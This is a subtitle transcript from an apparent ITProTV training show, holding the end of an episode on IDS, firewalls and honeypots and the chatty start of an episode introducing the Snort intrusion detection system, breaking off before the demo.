00:36:27.340\nAnd so when we use this, we're able\nto be able to more often enough,\n\n760\n00:36:27.340 --> 00:36:28.460\nwe do it smartly.\n\n761\n00:36:28.460 --> 00:36:31.470\nWe're able to put them out into\nan isolated area of the network, we should\n\n762\n00:36:31.470 --> 00:36:35.180\nthem cut off, so that they're not gonna\nbe able to actually touch anything value.\n\n763\n00:36:35.180 --> 00:36:38.790\nBut we will run them in a memory\nbubble essentially Sandbox and\n\n764\n00:36:38.790 --> 00:36:42.900\nas a result of doing that, we then run\ncontinuous monitoring and have all the.\n\n765\n00:36:42.900 --> 00:36:46.720\nCapabilities we need to do the deep packet\ninspection of traffic coming and going.\n\n766\n00:36:46.720 --> 00:36:49.180\nThen we're able to really understand\nwhat may or may not be happening.\n\n767\n00:36:49.180 --> 00:36:51.890\nAnd it's a great way to observe\nattacks happening in real time,\n\n768\n00:36:51.890 --> 00:36:52.950\nwhich is kind of cool.\n\n769\n00:36:52.950 --> 00:36:55.700\nThere are cool videos out there\non YouTube among other places,\n\n770\n00:36:55.700 --> 00:36:59.290\nwhere you can see this kind of information\nor these kind of systems being set up.\n\n771\n00:36:59.290 --> 00:37:02.618\nAnd you can obviously figure out\nwhether or not they make sense for you.\n\n772\n00:37:02.618 --> 00:37:05.550\nI think honeynet.org if I'm not mistaken,\nright?\n\n773\n00:37:05.550 --> 00:37:07.830\nWould be the website, or\nat least the main website to talk about or\n\n774\n00:37:07.830 --> 00:37:08.540\nthink about there.\n\n775\n00:37:08.540 --> 00:37:10.170\nSo you can take a look at that.\n\n776\n00:37:10.170 --> 00:37:15.100\nIt's kind of the open source forum for\nhoney pot or honeynet information today.\n\n777\n00:37:15.100 --> 00:37:17.880\nLot of people are writing and\nposting and talking about things there.\n\n778\n00:37:17.880 --> 00:37:20.190\nSo, it just may be something\nto take a look at right.\n\n779\n00:37:20.190 --> 00:37:24.700\nJust to give a little kick start if you\nwill to think about those kind of things.\n\n780\n00:37:24.700 --> 00:37:26.940\nAlright, we'll obviously get\nthat out there for you and\n\n781\n00:37:26.940 --> 00:37:28.670\nmake sure you're aware of that as well.\n\n782\n00:37:28.670 --> 00:37:30.500\n&gt;&gt; All right Adam, fantastic stuff.\n\n783\n00:37:30.500 --> 00:37:32.990\nGood look at all of\nthese different devices.\n\n784\n00:37:32.990 --> 00:37:35.790\nNot necessarily devices but\nintrusion detection system,\n\n785\n00:37:35.790 --> 00:37:37.400\nintrusion prevention system.\n\n786\n00:37:37.400 --> 00:37:38.920\nHow those work,\nwhat are the differences were,\n\n787\n00:37:38.920 --> 00:37:41.210\nwhere are those place in the network.\n\n788\n00:37:41.210 --> 00:37:43.290\nWhich is the key to making sure\nthat they are operating successful.\n\n789\n00:37:43.290 --> 00:37:47.365\nLook at the different types of firewall,\nwe need to be familiar with\n\n790\n00:37:47.365 --> 00:37:50.725\nrounded that off with a look at honey\npots and where those can be used.\n\n791\n00:37:50.725 --> 00:37:51.505\nSo we thank you for\n\n792\n00:37:51.505 --> 00:37:54.575\nthat great information there hope\neverybody out there enjoyed watching.\n\n793\n00:37:54.575 --> 00:37:57.445\nSigning off for ITProTV I'm Mike Roderick.\n\n794\n00:37:57.445 --> 00:37:58.485\n&gt;&gt; I'm Adam Gordon.\n\n795\n00:37:58.485 --> 00:38:01.885\n&gt;&gt; And we'll see you next time.\n\n",

I am good.\nI am exciting,\n\n11\n00:00:38.276 --> 00:00:43.052\napparently, according to my press\nagent standing to my side here.\n\n12\n00:00:43.052 --> 00:00:47.463\nSo we're gonna talk a little bit\nmore about IDS's, about firewalls,\n\n13\n00:00:47.463 --> 00:00:48.675\nabout honeypots.\n\n14\n00:00:48.675 --> 00:00:49.480\nWe're actually gonna zero in,\n\n15\n00:00:49.480 --> 00:00:52.540\nat least for the first few minutes\nof our conversation on IDS's.\n\n16\n00:00:52.540 --> 00:00:57.390\nSpecifically, we want to talk a bit about,\nwhat a typical IDS may look like,\n\n17\n00:00:57.390 --> 00:00:59.082\nhow one can be set up.\n\n18\n00:00:59.082 --> 00:01:02.600\nWe're gonna actually show you\nhow to configure one and use it.\n\n19\n00:01:02.600 --> 00:01:05.300\nA popular one in the sense that\nit's been around for a long time.\n\n20\n00:01:05.300 --> 00:01:06.870\nA lot of people do use it.\n\n21\n00:01:06.870 --> 00:01:11.490\nBut, more and more today there are so\nmany options, so many choices, a lot of\n\n22\n00:01:11.490 --> 00:01:16.010\nthem are centralized today, and coming\nfrom a central management prospective.\n\n23\n00:01:16.010 --> 00:01:18.270\nThere are cloud-based\nsolutions you can deploy.\n\n24\n00:01:18.270 --> 00:01:21.820\nBut, you may not necessarily use some\nof the tools that we will go over.\n\n25\n00:01:21.820 --> 00:01:25.670\nThat doesn't mean that it is still not\nimportant for you to have one, and\n\n26\n00:01:25.670 --> 00:01:28.380\nit doesn't mean that you should\nnot consider the use of one.\n\n27\n00:01:28.380 --> 00:01:30.870\nBut we're gonna show you an oldie,\nbut a goodie as they say.\n\n28\n00:01:30.870 --> 00:01:34.100\nWhat do we have on tap for\nour fine studio audience there Magic Mike?\n\n29\n00:01:34.100 --> 00:01:36.050\n&gt;&gt; I think we're gonna look\nat some Snort aren't we?\n\n30\n00:01:36.050 --> 00:01:37.610\n&gt;&gt; We're gonna Snort?\n\n31\n00:01:37.610 --> 00:01:38.900\n&gt;&gt; We're gonna Snort.\n\n32\n00:01:38.900 --> 00:01:40.530\n&gt;&gt; Wow.\n&gt;&gt; Wait is this the 80s?\n\n33\n00:01:40.530 --> 00:01:42.090\n&gt;&gt; This is awesome.\n\n34\n00:01:42.090 --> 00:01:43.270\nWe're gonna Snort.\n\n35\n00:01:43.270 --> 00:01:45.500\nOkay so, let's Snort, shall we?\n\n36\n00:01:45.500 --> 00:01:49.160\nSo all right, so, what we're gonna do\nbefore we talk about, actually demo Snort\n\n37\n00:01:49.160 --> 00:01:52.500\nfor you is, we're gonna take a quick look\nat just some of the basics behind Snort.\n\n38\n00:01:52.500 --> 00:01:54.710\nPut together a set of notes for\nyou that'll be helpful.\n\n39\n00:01:54.710 --> 00:01:58.950\nJust give you a sense, in case you haven't\nheard of the pig before, what it is and\n\n40\n00:01:58.950 --> 00:01:59.870\nhow we do it.\n\n41\n00:01:59.870 --> 00:02:03.130\nAnd what we're gonna also wanna do after\nwe finish this, while I'm doing the demo.\n\n42\n00:02:03.130 --> 00:02:04.410\nI forgot to mention it to you.\n\n43\n00:02:04.410 --> 00:02:07.187\nWe're gonna wanna make sure we give those\nnice people out there the website that\n\n44\n00:02:07.187 --> 00:02:08.315\nthey can go to for snorting.\n\n45\n00:02:08.315 --> 00:02:09.820\n&gt;&gt; Okay.\n&gt;&gt; And just put that up so\n\n46\n00:02:09.820 --> 00:02:12.720\nthey can obviously check that out on their\nown on some point if they're interested.\n\n47\n00:02:12.720 --> 00:02:13.820\nAlways good to know how to do that.\n\n48\n00:02:13.820 --> 00:02:16.088\nAnd you can share your binder\nstory with them later if you like.\n\n49\n00:02:16.088 --> 00:02:16.660\n&gt;&gt; Okay.\n\n50\n00:02:16.660 --> 00:02:20.185\n&gt;&gt; That would always be a hoot and\na holler as they say.\n\n51\n00:02:20.185 --> 00:02:22.650\n&gt;&gt; [LAUGH]\n&gt;&gt; Down in the old pig corral.\n\n52\n00:02:22.650 --> 00:02:26.106\nAll right, so Snort is an IDS,\nsee there's a command line IDS,\n\n53\n00:02:26.106 --> 00:02:28.610\none that's been around for a long time.\n\n54\n00:02:28.610 --> 00:02:33.040\nIt is still popular and\ncertainly still used quite often.\n\n55\n00:02:33.040 --> 00:02:37.020\nIt is one that is good\nto cut your teeth on,\n\n56\n00:02:37.020 --> 00:02:41.420\nin the sense that it is a little\nbit challenging, but not so\n\n57\n00:02:41.420 --> 00:02:44.680\nchallenging that you would\nhave trouble figuring it out.\n\n58\n00:02:44.680 --> 00:02:46.490\nIt's also free.\n\n59\n00:02:46.490 --> 00:02:47.200\nWe like free.\n\n60\n00:02:47.200 --> 00:02:47.830\n&gt;&gt; We do like free.\n\n61\n00:02:47.830 --> 00:02:49.864\n&gt;&gt; Say free with me. [CROSSTALK] &gt;&gt; Free.\n\n62\n00:02:49.864 --> 00:02:51.750\n&gt;&gt; We like free.\nMaybe you didn't say free.\n\n63\n00:02:51.750 --> 00:02:56.450\nWe like free because free means that\nyou can spend time figuring it out and\n\n64\n00:02:56.450 --> 00:02:58.680\nyou don't have to worry about paying for\nlicensing.\n\n65\n00:02:58.680 --> 00:03:01.430\nAnd you know that I've talked about this\nbefore with some of the tools we use.\n\n66\n00:03:01.430 --> 00:03:05.003\nI'm a big proponent of security\ntools that do their job.\n\n67\n00:03:05.003 --> 00:03:07.780\nAnd if you've gotta pay for them,\nI think that's the right way to go.\n\n68\n00:03:07.780 --> 00:03:11.650\nBut I'm also a big proponent of being\nsmarter and not necessarily just wasting\n\n69\n00:03:11.650 --> 00:03:14.930\nour corporate resources, and\nour time, and our energy frivolously.\n\n70\n00:03:14.930 --> 00:03:17.674\nAnd I'm not suggesting anybody\ndoes that on purpose, but\n\n71\n00:03:17.674 --> 00:03:20.866\nI am just pointing out that sometimes\nthat mindset in companies is,\n\n72\n00:03:20.866 --> 00:03:23.670\nwell if we don't pay for\nit, it's not good, right?\n\n73\n00:03:23.670 --> 00:03:27.020\nSo if we didn't pay money for it then it\ncouldn't be possibly be a good tool, and\n\n74\n00:03:27.020 --> 00:03:28.710\nthat's just not always the case.\n\n75\n00:03:28.710 --> 00:03:32.038\nYou just have to invest the time to\nfigure out what the best approach is.\n\n76\n00:03:32.038 --> 00:03:35.460\nAnd a lot of times there are tools\nout there that will do the job, but\n\n77\n00:03:35.460 --> 00:03:39.434\nthey may not necessarily be the tools\nthat everybody chooses to use because,\n\n78\n00:03:39.434 --> 00:03:43.540\nfor whatever reason, maybe the entry\nbar in terms of knowledge is higher.\n\n79\n00:03:43.540 --> 00:03:45.950\nMaybe as we said,\nit's command line interface.\n\n80\n00:03:45.950 --> 00:03:47.410\nAnd that does scare some people.\n\n81\n00:03:47.410 --> 00:03:48.456\nLet's be honest, right.\n\n82\n00:03:48.456 --> 00:03:51.757\nIn the Windows-centric, point and\nclick world that we live in today,\n\n83\n00:03:51.757 --> 00:03:55.540\nnot everybody is comfortable going in and\nhacking away at the command line.\n\n84\n00:03:55.540 --> 00:03:57.400\nNotice how I inserted\nthe concept of hack there.\n\n85\n00:03:57.400 --> 00:03:58.865\n&gt;&gt; Yes, I like that.\n\n86\n00:03:58.865 --> 00:04:00.998\n&gt;&gt; So, hacking away at the pig.\n\n87\n00:04:00.998 --> 00:04:02.710\n&gt;&gt; Yeah. [LAUGH] &gt;&gt; Right,\nthe whole theme here.\n\n88\n00:04:02.710 --> 00:04:07.050\nSo, and the funny part is that it's the\nJewish guy making the good jokes which is\n\n89\n00:04:07.050 --> 00:04:08.944\neven the funnier part\nabout the whole thing.\n\n90\n00:04:08.944 --> 00:04:11.276\n&gt;&gt; [LAUGH]\n&gt;&gt; So when we think about all this,\n\n91\n00:04:11.276 --> 00:04:15.364\nwe just want to remind you,\njust wanna understand that ultimately,\n\n92\n00:04:15.364 --> 00:04:18.120\nthis is really important for\nyou to consider.\n\n93\n00:04:18.120 --> 00:04:20.685\nYou've got to decide how to build that\ntoolkit that we keep talking about.\n\n94\n00:04:20.685 --> 00:04:24.140\nThat referenceable set of tools and\nknowledge.\n\n95\n00:04:24.140 --> 00:04:27.005\nI'm missing the top of my head,\nbecause when I actually do stand up,\n\n96\n00:04:27.005 --> 00:04:27.730\n&gt;&gt; [LAUGH]\n\n97\n00:04:27.730 --> 00:04:29.190\n&gt;&gt; My God, look at that.\n\n98\n00:04:29.190 --> 00:04:30.980\nI'm only a nose, I have no eyebrows.\n\n99\n00:04:30.980 --> 00:04:32.130\nSo the reality is,\n\n100\n00:04:32.130 --> 00:04:36.281\nthat I either grew recently overnight,\nor somehow the floor was raised.\n\n101\n00:04:36.281 --> 00:04:37.896\n&gt;&gt; [LAUGH]\n&gt;&gt; Which could be the case,\n\n102\n00:04:37.896 --> 00:04:39.920\ncuz we are doing some odds and ends.\n\n103\n00:04:39.920 --> 00:04:42.900\nKinda tinkering, here, or\nperhaps the ceiling shrank.\n\n104\n00:04:42.900 --> 00:04:43.590\nI'm not sure which.\n\n105\n00:04:43.590 --> 00:04:45.430\nWe could be in a lower room.\n\n106\n00:04:45.430 --> 00:04:46.600\n&gt;&gt; Ooh.\n&gt;&gt; Or we could be in a higher room.\n\n107\n00:04:46.600 --> 00:04:49.990\n&gt;&gt; That makes me think of\nthe Haunted Mansion out at Disney World.\n\n108\n00:04:49.990 --> 00:04:51.830\n&gt;&gt; When you go in there, and\nthey're like, yeah, you go in.\n\n109\n00:04:51.830 --> 00:04:55.350\nSo, funny story about that, right, so\nthis is our random aside for this episode.\n\n110\n00:04:55.350 --> 00:04:56.930\nSo, if you're keeping track.\n\n111\n00:04:56.930 --> 00:05:01.327\nSo, I told you, I've been there with the\nkids every six weeks when they were young\n\n112\n00:05:01.327 --> 00:05:02.814\ncuz we have annual passes.\n\n113\n00:05:02.814 --> 00:05:05.547\nSo literally every time I would get\nfree time my wife would go, come on,\n\n114\n00:05:05.547 --> 00:05:06.806\nwe're going.\n\n115\n00:05:06.806 --> 00:05:07.361\n&gt;&gt; God, not again.\n\n116\n00:05:07.361 --> 00:05:08.870\nAll right, so we get in the car, we go.\n\n117\n00:05:08.870 --> 00:05:15.050\nAnd so my little one who for the longest\nwhile, and actually both of my girls,\n\n118\n00:05:15.050 --> 00:05:19.060\nwhen my older girl was\nprobably in this age group.\n\n119\n00:05:19.060 --> 00:05:23.050\nSo maybe from two to five,\nwhen they're really young.\n\n120\n00:05:23.050 --> 00:05:27.889\nYou can't take them on a lot of rides, so\nyou spend your time, all day basically,\n\n121\n00:05:27.889 --> 00:05:29.304\non It's a Small World.\n\n122\n00:05:29.304 --> 00:05:32.674\nOccasionally you go into the Hall of\nProgress or the Carousel of Progress,\n\n123\n00:05:32.674 --> 00:05:34.826\ncuz you've just got to sit down and\ntake a rest.\n\n124\n00:05:34.826 --> 00:05:35.590\n&gt;&gt; [LAUGH]\n&gt;&gt; For 20 minutes.\n\n125\n00:05:35.590 --> 00:05:37.710\nYou put them between you so\nthey can't run away.\n\n126\n00:05:37.710 --> 00:05:41.240\nAnd then you get a nap and\nthey get to kind of watch and play.\n\n127\n00:05:41.240 --> 00:05:44.980\nSo we're doing all this stuff and\nwe go to the haunted house.\n\n128\n00:05:44.980 --> 00:05:46.150\nWhich I went to as a kid.\n\n129\n00:05:46.150 --> 00:05:48.750\nI grew up in Florida,\nI went to Disney World.\n\n130\n00:05:48.750 --> 00:05:51.460\nAnd so we went there, and\nwe took the girls in and\n\n131\n00:05:51.460 --> 00:05:53.750\nwe didn't really tell them what was\ngonna happen and as you were saying.\n\n132\n00:05:53.750 --> 00:05:56.495\nYou go into the room, and the very first\nthing is you go and it gets dark and\n\n133\n00:05:56.495 --> 00:05:57.720\nspooky, and the lights go out.\n\n134\n00:05:57.720 --> 00:06:00.140\nThe ceiling stretches before it goes down,\nyou get out and\n\n135\n00:06:00.140 --> 00:06:03.800\nyou go on the a little conveyor belt,\nbrought to you by Goodyear, right?\n\n136\n00:06:03.800 --> 00:06:05.300\nAnd they have the little\nGoodyear conveyor belt.\n\n137\n00:06:05.300 --> 00:06:07.470\nYou go out, you get in the clamshell,\nand you go do the ride.\n\n138\n00:06:07.470 --> 00:06:10.740\nSo, we go in, and both of my girls,\n\n139\n00:06:10.740 --> 00:06:13.670\nwhen they were young,\nscared to death of the dark.\n\n140\n00:06:13.670 --> 00:06:14.690\nIt's common for children.\n\n141\n00:06:14.690 --> 00:06:16.700\nIt's not just them.\n\n142\n00:06:16.700 --> 00:06:20.900\nThey are, obviously, bigger weenies than\nmost, but it's a kid thing, traditionally.\n\n143\n00:06:20.900 --> 00:06:22.450\nYou're scared of the dark.\n\n144\n00:06:22.450 --> 00:06:25.980\nAnd so we did this without telling them,\nbig mistake right?\n\n145\n00:06:25.980 --> 00:06:29.390\nI'm sure Disney is used to screening\nterrified children in this ride, but\n\n146\n00:06:29.390 --> 00:06:30.005\nnot like mine.\n\n147\n00:06:30.005 --> 00:06:30.505\n&gt;&gt; [LAUGH]\n&gt;&gt; Right.\n\n148\n00:06:30.505 --> 00:06:34.082\nSo this was a major traumatic experience.\n\n149\n00:06:34.082 --> 00:06:34.664\n&gt;&gt; Blood-curdling scream.\n\n150\n00:06:34.664 --> 00:06:37.943\n&gt;&gt; Yeah, because every so\noften they'll remind me like,\n\n151\n00:06:37.943 --> 00:06:41.458\nyou did to us when we were young and\nwe're still not over it.\n\n152\n00:06:41.458 --> 00:06:43.490\n&gt;&gt; [LAUGH]\n&gt;&gt; And so, okay no problem.\n\n153\n00:06:43.490 --> 00:06:47.640\nSo, yeah, next time your in a room and\nit starts shrinking, there you go.\n\n154\n00:06:47.640 --> 00:06:48.840\nRight, just remember that.\n\n155\n00:06:48.840 --> 00:06:51.720\nSo, luckily the lights don't\ngo out here at ITProTV,\n\n156\n00:06:51.720 --> 00:06:55.640\ncuz Megan wouldn't let that happen cuz\nthen we'd actually be able to see.\n\n157\n00:06:55.640 --> 00:06:57.172\nSo that would be bad.\n\n158\n00:06:57.172 --> 00:07:00.640\nSo, we were talking about snorting, and\n\n159\n00:07:00.640 --> 00:07:03.740\nthe fact that I am getting shorter but\nalso that we are here to talk about IDS's.\n\n160\n00:07:03.740 --> 00:07:05.970\nSo let's actually get back\nto what we're talking about.\n\n161\n00:07:05.970 --> 00:07:08.600\nBut what I just wanted to make the point\non quickly before we go back in and\n\n162\n00:07:08.600 --> 00:07:10.170\ntalk about this concept of Snort is.\n\n163\n00:07:10.170 --> 00:07:13.950\nAs you pick up and figure out what\ntools you're comfortable with.\n\n164\n00:07:13.950 --> 00:07:17.790\nAnd this is really a, let's go sample\nstuff and figure it of kind of approach,\n\n165\n00:07:17.790 --> 00:07:20.390\nthroughout not only this\nkind of a discussion, but\n\n166\n00:07:20.390 --> 00:07:21.615\nin general around security.\n\n167\n00:07:21.615 --> 00:07:26.040\nI come across hundreds of tools that\npotentially do the jobs that we need done\n\n168\n00:07:26.040 --> 00:07:27.060\nfor this kind of stuff.\n\n169\n00:07:27.060 --> 00:07:29.884\nBut most of them just aren't\nnecessarily appropriate, or\n\n170\n00:07:29.884 --> 00:07:35.088\na good fit for any one context, but\nwhat I wanna have is knowledge of them.\n\n171\n00:07:35.088 --> 00:07:37.370\nI wanna have a core set of\ntools that I can go to, right.\n\n172\n00:07:37.370 --> 00:07:38.310\nThat I can work with.\n\n173\n00:07:38.310 --> 00:07:39.910\nThat I'm comfortable with everyday.\n\n174\n00:07:39.910 --> 00:07:43.668\nBut I also want to have tools that I know,\nfor a special job, special need,\n\n175\n00:07:43.668 --> 00:07:45.350\nI can pull off the shelf, right?\n\n176\n00:07:45.350 --> 00:07:47.310\nAnd I can use if necessary.\n\n177\n00:07:47.310 --> 00:07:48.470\nRemember Caddyshack?\n\n178\n00:07:48.470 --> 00:07:49.000\n&gt;&gt; Yes.\n&gt;&gt; Right.\n\n179\n00:07:49.000 --> 00:07:49.990\nSo, Billy Baroo, right.\n\n180\n00:07:49.990 --> 00:07:53.740\nSo, Ted Danson's Matt,\nthat club that he buys.\n\n181\n00:07:53.740 --> 00:07:56.270\nThat it's like the best\ngolf club in the world.\n\n182\n00:07:56.270 --> 00:07:57.730\nAnd he just goes nuts with the golf club.\n\n183\n00:07:57.730 --> 00:07:58.900\nIt's his special thing.\n\n184\n00:07:58.900 --> 00:08:00.580\nSo it's kinda like that, right?\n\n185\n00:08:00.580 --> 00:08:01.604\nSo that's what we're talking about.\n\n186\n00:08:01.604 --> 00:08:04.032\nProbably nobody out there listens to\nthis has any point of reference for\n\n187\n00:08:04.032 --> 00:08:04.769\nthat conversation.\n\n188\n00:08:04.769 --> 00:08:06.494\n&gt;&gt; If you haven't seen Caddyshack,\nyou've got to watch.\n\n189\n00:08:06.494 --> 00:08:07.747\n&gt;&gt; It's an awesome movie.\n\n190\n00:08:07.747 --> 00:08:09.199\nAwesome.\n&gt;&gt; I'll tell you what I really like\n\n191\n00:08:09.199 --> 00:08:09.784\nabout Snort 2.\n\n192\n00:08:09.784 --> 00:08:11.203\nOne, as you said, it's free.\n\n193\n00:08:11.203 --> 00:08:12.780\n&gt;&gt; Yep.\n&gt;&gt; It's incredibly powerful.\n\n194\n00:08:12.780 --> 00:08:13.620\n&gt;&gt; It is.\n&gt;&gt; It's as powerful as\n\n195\n00:08:13.620 --> 00:08:16.230\na lot of the paid versions\nof these kind of tools.\n\n196\n00:08:16.230 --> 00:08:19.740\nAnd it is more difficult to work with,\ncuz you really gotta get in there and\n\n197\n00:08:19.740 --> 00:08:21.390\nwrite these rules.\n\n198\n00:08:21.390 --> 00:08:24.070\nBut I tell you,\nit's one of those learning tools, right?\n\n199\n00:08:24.070 --> 00:08:26.900\nIt's like I tell people when I'm\nteaching Access, for example.\n\n200\n00:08:26.900 --> 00:08:30.108\nIf you would just flip over and look at\nthe Transact SQL view for just a second\n\n201\n00:08:30.108 --> 00:08:34.350\nand stop using that graphical interface,\nyou'd start to understand what's going on.\n\n202\n00:08:34.350 --> 00:08:37.860\nSo by using a tool like this and\nby learning how to write these rules,\n\n203\n00:08:37.860 --> 00:08:41.190\nyou move over one of these\npaid graphical versions,\n\n204\n00:08:41.190 --> 00:08:42.540\nyou understand what's going\non in the background.\n\n205\n00:08:42.540 --> 00:08:45.990\nWhen something's not working right, you\nkind of have an idea of what it might be,\n\n206\n00:08:45.990 --> 00:08:47.390\nand it just helps you in the long run.\n\n207\n00:08:47.390 --> 00:08:48.380\n&gt;&gt; It does.\n\n208\n00:08:48.380 --> 00:08:51.650\nIt makes you a better security\nprofessional ultimately because we often,\n\n209\n00:08:51.650 --> 00:08:55.230\nand Mike raises a really,\nreally important point with his comment,\n\n210\n00:08:55.230 --> 00:09:00.671\nwhich is we often will take for granted,\nI think, a lot of the things we do.\n\n211\n00:09:00.671 --> 00:09:04.034\nAnd in the world we live in today,\nespecially with some of the tools we use,\n\n212\n00:09:04.034 --> 00:09:05.990\nwhere it is a point and click environment.\n\n213\n00:09:05.990 --> 00:09:11.645\nIn any of these environments today, right,\nespecially these large scale corporate\n\n214\n00:09:11.645 --> 00:09:17.475\nbased IPS, IDF systems that are SEM\nsystems and do all the framework stuff.\n\n215\n00:09:17.475 --> 00:09:20.755\nWhen you get into any of those and more\noften than not it's a graphical interface\n\n216\n00:09:20.755 --> 00:09:22.625\nthat you're clicking on to build rules.\n\n217\n00:09:22.625 --> 00:09:25.483\nAnd as a result you're not really looking\nat the language, you're simply just,\n\n218\n00:09:25.483 --> 00:09:30.005\nyou're either modularly constructing or\nliterally you click on an attack type and\n\n219\n00:09:30.005 --> 00:09:32.870\nit say okay boom, boom, boom and it writes\nthe rule and it just creates it for you.\n\n220\n00:09:32.870 --> 00:09:36.890\nYou don't really see the logic, you don't\nreally understand the thought process and\n\n221\n00:09:36.890 --> 00:09:39.216\nso it's almost security by proxy, right?\n\n222\n00:09:39.216 --> 00:09:41.660\nIn the sense that you're\ndelegating to somebody else, or\n\n223\n00:09:41.660 --> 00:09:46.300\nan entity, what you want done, which is\nokay until things stop working, you have\n\n224\n00:09:46.300 --> 00:09:49.652\nto troubleshoot and or somebody says to\nyou, by the way are we looking for this.\n\n225\n00:09:49.652 --> 00:09:50.830\nAre we protecting this?\n\n226\n00:09:50.830 --> 00:09:55.150\nIs this something we have the visibility\ninto and if so, how and why?\n\n227\n00:09:55.150 --> 00:09:56.740\nAnd you don't really know.\n\n228\n00:09:56.740 --> 00:09:59.529\nYou're not gonna be able\nto offer guidance and\n\n229\n00:09:59.529 --> 00:10:02.031\nadvice and give them, whoever they are,\n\n230\n00:10:02.031 --> 00:10:06.837\nthe benefit of that expertise that they\nare relying on you to bring to the table.\n\n231\n00:10:06.837 --> 00:10:10.055\nAnd you're not acting ethically, you're\nnot acting honestly, not because you're\n\n232\n00:10:10.055 --> 00:10:12.754\ndoing anything wrong, but just\nbecause you're not really in the know.\n\n233\n00:10:12.754 --> 00:10:16.216\nAnd you have to understand that\nthe majority of the responsibility,\n\n234\n00:10:16.216 --> 00:10:20.215\nthe due care and due diligence that we as\nsecurity professionals have to bring to\n\n235\n00:10:20.215 --> 00:10:21.720\nthe table, is exactly that.\n\n236\n00:10:21.720 --> 00:10:25.310\nIt's the knowledge of the environment and\nthe capability list and\n\n237\n00:10:25.310 --> 00:10:27.420\nthe understanding of\nthe possible issues and\n\n238\n00:10:27.420 --> 00:10:30.840\nconcerns that we are prepared\nto understand how to address.\n\n239\n00:10:30.840 --> 00:10:34.910\nThey may never occur, but we have to know\nthat if they did, this is how we would\n\n240\n00:10:34.910 --> 00:10:39.600\nrespond, this is where we are or\nare not prepared to operate within.\n\n241\n00:10:39.600 --> 00:10:42.170\nSo it's a very important thought process,\na very important lesson,\n\n242\n00:10:42.170 --> 00:10:46.860\nand a reminder for us that Mike helps\nus to focus on by talking about this.\n\n243\n00:10:46.860 --> 00:10:50.190\nBecause it is really one of the primary\nlessons, as security professionals,\n\n244\n00:10:50.190 --> 00:10:51.920\nwe have to always carry with us,\nevery day.\n\n245\n00:10:51.920 --> 00:10:53.180\nAm I prepared?\n\n246\n00:10:53.180 --> 00:10:55.300\nAnd if I'm not,\nwhat am I going to do differently?\n\n247\n00:10:55.300 --> 00:10:57.120\nIt's going to be very important, right?\n\n248\n00:10:57.120 --> 00:10:59.030\nYou can be like those crazy\npreppers that we see on TV.\n\n249\n00:10:59.030 --> 00:11:00.580\nHave you seen those commercials recently?\n\n250\n00:11:00.580 --> 00:11:01.580\nI don't know what it is.\n\n251\n00:11:01.580 --> 00:11:05.880\nCertain times of the year you get\nlike cycles and like everything else.\n\n252\n00:11:05.880 --> 00:11:08.500\nThere's this one guy on tv,\nwho's hawking the pre-made food.\n\n253\n00:11:08.500 --> 00:11:09.268\nYou put in a bucket\n&gt;&gt; Yeah.\n\n254\n00:11:09.268 --> 00:11:10.520\n&gt;&gt; Yeah..\n&gt;&gt; In 25 years it will be there.\n\n255\n00:11:10.520 --> 00:11:11.350\nThat kind of thing.\n\n256\n00:11:11.350 --> 00:11:16.054\nSo, I don't know if it's just the crazy\npolitical feed or election cycle we're in.\n\n257\n00:11:16.054 --> 00:11:16.556\n&gt;&gt; Yeah.\n&gt;&gt; Yeah.\n\n258\n00:11:16.556 --> 00:11:19.960\n&gt;&gt; Which is a whole social commentary\non what's happening in the country.\n\n259\n00:11:19.960 --> 00:11:22.350\nYeah I'm just not sure what\ncauses this to happen,\n\n260\n00:11:22.350 --> 00:11:25.860\nbut there's a whole series of these\nads I've been seeing on TV recently.\n\n261\n00:11:25.860 --> 00:11:29.850\nSpecifically like hey Doomsday's coming,\nand you got to go out and buy the food.\n\n262\n00:11:29.850 --> 00:11:31.550\nAnd boy we got a deal for you, right.\n\n263\n00:11:31.550 --> 00:11:33.500\nWe'll give you the water in a pouch and\n\n264\n00:11:33.500 --> 00:11:37.600\nthe glow stick along with a parting\ngift if you buy the food.\n\n265\n00:11:37.600 --> 00:11:40.840\nBut there's just a whole series of these\ndoomsday prepper commercials that have\n\n266\n00:11:40.840 --> 00:11:41.540\nbeen all over the place.\n\n267\n00:11:41.540 --> 00:11:43.460\n&gt;&gt; There does seem to be more and more.\n\n268\n00:11:43.460 --> 00:11:45.380\n&gt;&gt; And\nit's funny cuz when I'm outside of the US,\n\n269\n00:11:45.380 --> 00:11:48.590\nyou obviously don't see a lot of that\nstuff outside the US the way we do here\n\n270\n00:11:48.590 --> 00:11:49.242\n&gt;&gt; When I'm outside the US,\n\n271\n00:11:49.242 --> 00:11:51.020\npeople will stop and talk to me sometimes.\n\n272\n00:11:52.070 --> 00:11:54.290\nGhana or wherever I am doing work,\nfor instance.\n\n273\n00:11:54.290 --> 00:11:58.270\nOne time I was there and my friend said\nto me is really like what we see on tv,\n\n274\n00:11:58.270 --> 00:12:00.360\njust because they've never been to the US.\n\n275\n00:12:00.360 --> 00:12:02.049\nIs that really how it's like, right?\n\n276\n00:12:02.049 --> 00:12:05.048\nDo you really just have crazy people\nrunning around telling you the end of\n\n277\n00:12:05.048 --> 00:12:07.390\nthe world is coming and\npeople believe them?\n\n278\n00:12:07.390 --> 00:12:09.320\nAnd I said no, it's really not like that.\n\n279\n00:12:09.320 --> 00:12:12.860\nPlease don't think ill of us at all\nbecause it is definitely not like that.\n\n280\n00:12:12.860 --> 00:12:13.720\nNot even close.\n\n281\n00:12:13.720 --> 00:12:18.110\nBut you know the people, yo, I'm almost\nlike ashamed sometimes cause people think\n\n282\n00:12:18.110 --> 00:12:19.440\nlike we're just a house of kooks and\n\n283\n00:12:19.440 --> 00:12:21.950\nwe just don't have our shit together,\nhave it all in order.\n\n284\n00:12:21.950 --> 00:12:23.630\nI apologize about saying that.\n\n285\n00:12:23.630 --> 00:12:27.290\nAnd so, just the reality is\nthat people feel sometimes,\n\n286\n00:12:27.290 --> 00:12:29.040\nthis is the perception they have.\n\n287\n00:12:29.040 --> 00:12:32.000\nAnd so we just got to think about that\nbecause that's really not a good thing.\n\n288\n00:12:32.000 --> 00:12:33.870\nAnyway, let's get back to\nwhat we're talking about.\n\n289\n00:12:33.870 --> 00:12:34.390\n&gt;&gt; Snort.\n\n290\n00:12:34.390 --> 00:12:35.850\n&gt;&gt; So Snort, can we put the list back up?\n\n291\n00:12:35.850 --> 00:12:38.226\nI just want to go through the notes\nreal quick before we jump in and\n\n292\n00:12:38.226 --> 00:12:38.846\nget to the demo.\n\n293\n00:12:38.846 --> 00:12:42.240\nSo we've talked about the fact\nthat Snort is an IDS, right?\n\n294\n00:12:42.240 --> 00:12:45.740\nWe just kind 